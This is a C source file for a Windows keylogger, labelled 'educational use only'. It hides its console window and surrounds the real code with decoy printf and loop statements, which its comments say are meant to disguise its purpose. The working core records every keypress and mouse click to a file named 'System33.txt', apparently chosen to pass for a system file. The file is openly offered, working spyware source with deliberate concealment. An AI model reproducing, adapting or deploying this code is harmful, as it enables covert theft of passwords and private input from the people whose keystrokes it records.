#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

//EDUCATIONAL USE ONLY DO NOT USE FOR MALICIOUS PURPOSES OR YOU WILL BE COMMITING A CRIME

int Return(int input, char *file); //This function will return a key press

//FAKE FUNCTIONS THAT DO NOTHING INTENDED TO OBSCURE CODE
void handle_interrupt(int interrupt);
void manage_file_system();
void respond_to_user_input();

int main(void){

    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // example of Code Obfuscation
    // code below is intended to blend the keylogger to make it more difficult to spot

     printf("Initializing system components...\n");

    // Set up hardware resources
    printf("Setting up hardware resources...\n");

    // Initialize memory management
    printf("Initializing memory management...\n");

    // Start system services
    printf("Starting system services...\n");

    // Load kernel modules
    printf("Loading kernel modules...\n");

    // Initialize process manager
    printf("Initializing process manager...\n");

    // Create system processes
    printf("Creating system processes...\n");

    // Perform system checks
    printf("Performing system checks...\n");

    // Complete system initialization
    printf("System initialization complete.\n");

    // Respond to user input

    // Perform periodic tasks (e.g., scheduling, resource management)
    printf("Performing periodic tasks...\n");

    // Allocate memory dynamically
    printf("Allocating memory...\n");
    int *ptr = (int *)malloc(sizeof(int) * 10);
    if (ptr == NULL) {
        printf("Memory allocation failed.\n");
        return 1;
    }

    // Access memory
    printf("Accessing memory...\n");
    for (int i = 0; i < 10; i++) {
        ptr[i] = i * 10;
    }

    // Deallocate memory
    printf("Deallocating memory...\n");
    free(ptr);


    int a = 10;
    float b = 3.14;
    char c = 'A';
    double d = 2.718;
    long e = 1234567890L;

    if (a > 5) {
        printf("a is greater than 5\n");
    } else {
        printf("a is not greater than 5\n");
    }

    for (int i = 0; i < 5; i++) {
        printf("Iteration %d\n", i);
    }

    switch (c) {
        case 'A':
            printf("c is A\n");
            break;
        case 'B':
            printf("c is B\n");
            break;
        default:
            printf("c is neither A nor B\n");
    }

    while (b < 4.0) {
        b += 0.1;
    }

    printf("Final value of b: %f\n", b);

    //REAL CODE HERE!!!!
    //------------------------------------
    char x;

    //Gets input from keyboard and based on key gets its specific ascii value
    //then it goes to function and returns it into the System33 file which holds each keypress

    while(TRUE) {
        Sleep(10); //sleeps for 10 miliseconds to not bombard cpu while waiting for a key press
        for (x = 8; x<= 255; x++) {
            if (GetAsyncKeyState(x) == -32767) //used to get the correct key press value
                Return(x, "System33.txt"); //my return file
        }
    }
    //-------------------------------------
    //TRUE CODE ABOVE!!

    int w = 5;
    int y = 10;

    printf("The sum of x and y is: %d\n", w + y);

    for (int i = 0; i < 10; i++) {
        if (i % 2 == 0) {
            printf("%d is even\n", i);
        } else {
            printf("%d is odd\n", i);
        }
    }

    switch (w) {
        case 1:
            printf("w is 1\n");
            break;
        case 2:
            printf("w is 2\n");
            break;
        default:
            printf("w is neither 1 nor 2\n");
    }

    while (y > 0) {
        printf("y is now %d\n", y);
        y--;
    }

    printf("Done with the loop\n");


    return 0;
}

//REAL FUNCTION IS RETURN

int Return(int input, char *file){

    Sleep(10); //sleeps for 10 miliseconds to not bombard cpu while waiting for a key press
    FILE *DataReturned; 
    DataReturned = fopen(file, "a+"); //opening or creating the file that we will return the key press to.

    //using value rather than constant for Code Obfuscation
    // the less obvious makes it more difficult to discover its true purpose
    //switch case to determine which key was pressed
    switch(input) {
        case 0x10: fprintf(DataReturned, "[SHIFT]"); // Shift key
            break;
        case 0x11: fprintf(DataReturned, "[CTRL]"); // Ctrl key
            break;
        case 0x12: fprintf(DataReturned, "[ALT]"); // Alt key (also known as Menu key)
            break;
        case 0x5B: fprintf(DataReturned, "[LWIN]"); // Left windows key
            break;
        case 0x5C: fprintf(DataReturned, "[RWIN]"); // Right windows key
            break;
        case 0x14: fprintf(DataReturned, "[CAPS]"); // Caps lock key
            break;
        case 0x90: fprintf(DataReturned, "[NUMLOCK]"); // Num lock key
            break;
        case 0x91: fprintf(DataReturned, "[SCROLL]"); // Scroll lock pressed
            break;
        case 0x70: fprintf(DataReturned, "[F1]"); // F1 - F24 keys
            break;
        case 0x71: fprintf(DataReturned, "[F2]");
            break;
        case 0x72: fprintf(DataReturned, "[F3]");
            break;
        case 0x73: fprintf(DataReturned, "[F4]");
            break;
        case 0x74: fprintf(DataReturned, "[F5]");
            break;
        case 0x75: fprintf(DataReturned, "[F6]");
            break;
        case 0x76: fprintf(DataReturned, "[F7]");
            break;
        case 0x77: fprintf(DataReturned, "[F8]");
            break;
        case 0x78: fprintf(DataReturned, "[F9]");
            break;
        case 0x79: fprintf(DataReturned, "[F10]");
            break;
        case 0x7A: fprintf(DataReturned, "[F11]");
            break;
        case 0x7B: fprintf(DataReturned, "[F12]");
            break;
        case 0x7C: fprintf(DataReturned, "[F13]");
            break;
        case 0x7D: fprintf(DataReturned, "[F14]");
            break;
        case 0x7E: fprintf(DataReturned, "[F15]");
            break;
        case 0x7F: fprintf(DataReturned, "[F16]");
            break;
        case 0x80: fprintf(DataReturned, "[F17]");
            break;
        case 0x81: fprintf(DataReturned, "[F18]");
            break;
        case 0x82: fprintf(DataReturned, "[F19]");
            break;
        case 0x83: fprintf(DataReturned, "[F20]");
            break;
        case 0x84: fprintf(DataReturned, "[F21]");
            break;
        case 0x85: fprintf(DataReturned, "[F22]"); 
            break;
        case 0x86: fprintf(DataReturned, "[F23]"); 
            break;
        case 0x87: fprintf(DataReturned, "[F24]");
            break;
        case 0x25: fprintf(DataReturned, "[LEFT ARROW]"); // Left arrow key
            break;
        case 0x27: fprintf(DataReturned, "[RIGHT ARROW]"); // Right arrow key
            break;
        case 0x26: fprintf(DataReturned, "[UP ARROW]"); // Up arrow key
            break;
        case 0x28: fprintf(DataReturned, "[DOWN ARROW]"); // Down arrow key
            break;
        case 0x08: fprintf(DataReturned, "[BACKSPACE]"); // Backspace
            break;
        case 0x09: fprintf(DataReturned, "[TAB]"); // Tab
            break;
        case 0x0D: fprintf(DataReturned, "[ENTER]"); // Enter key
            break;
        case 0x1B: fprintf(DataReturned, "[ESCAPE]"); // Escape key
            break;
        case 0x20: fprintf(DataReturned, "[SPACE]"); // Space bar
            break;
        case 0x2E: fprintf(DataReturned, "[DELETE]"); // Delete key
            break;
        case 0x2D: fprintf(DataReturned, "[INSERT]"); // Insert key
            break;
        case 0x24: fprintf(DataReturned, "[HOME]"); // Home key
            break;
        case 0x23: fprintf(DataReturned, "[END]"); // End key
            break;
        case 0x21: fprintf(DataReturned, "[PAGE UP]"); // Page Up
            break;
        case 0x22: fprintf(DataReturned, "[PAGE DOWN]"); // Page Down
            break;
        case 0x01: fprintf(DataReturned, "[LEFT CLICK]"); // Left mouse button
            break;
        case 0x02: fprintf(DataReturned, "[RIGHT CLICK]"); // Right mouse button
            break;
        case 0x04: fprintf(DataReturned, "[MIDDLE MOUSE BUTTON]"); // Middle mouse button
            break;
        case 0x0100: fprintf(DataReturned, "[KEY DOWN]"); // Key down
            break;
        case 0x0101: fprintf(DataReturned, "[KEY UP]"); // Key up
            break;
        case 0x0104: fprintf(DataReturned, "[SYSTEM KEY DOWN]"); // System key down
            break;
        case 0x0105: fprintf(DataReturned, "[SYSTEM KEY UP]"); // System key up
            break;
        case 0x0102: fprintf(DataReturned, "[CHARACTER]"); // Character
            break;
        case 0x0103: fprintf(DataReturned, "[DEAD CHARACTER]"); // Dead character
            break;
        case 0xBA: fprintf(DataReturned, ";"); // ;:
            break;
        case 0xBB: fprintf(DataReturned, "="); // =+
            break;
        case 0xBC: fprintf(DataReturned, ","); // ,<
            break;
        case 0xBD: fprintf(DataReturned, "-"); // -_
            break;
        case 0xBE: fprintf(DataReturned, "."); // .>
            break;
        case 0xBF: fprintf(DataReturned, "/"); // /?
            break;
        case 0xC0: fprintf(DataReturned, "`"); // `~
            break;
        case 0xDB: fprintf(DataReturned, "["); // [{
            break;
        case 0xDC: fprintf(DataReturned, "\\"); // \|
            break;
        case 0xDD: fprintf(DataReturned, "]"); // ]}
            break;
        case 0xDE: fprintf(DataReturned, "'"); // '"
            break;
    }
    fprintf(DataReturned, "%c", input); //prints the case to the file
    fclose(DataReturned); //closes file
    return 0;
}



//FAKE FUNCTIONS DO NOTHING
void interrupt_handler(int signal) {
    printf("Interrupt signal received. Exiting...\n");
    exit(EXIT_SUCCESS);
}


//FAKE DO NOTHING
void respond_to_user_input(){
 char input;

    printf("Enter 'q' to quit: ");
    scanf("%c", &input);

    if (input == 'q') {
        printf("Quitting...\n");
    } else {
        printf("Invalid input. Please try again.\n");
    }

}
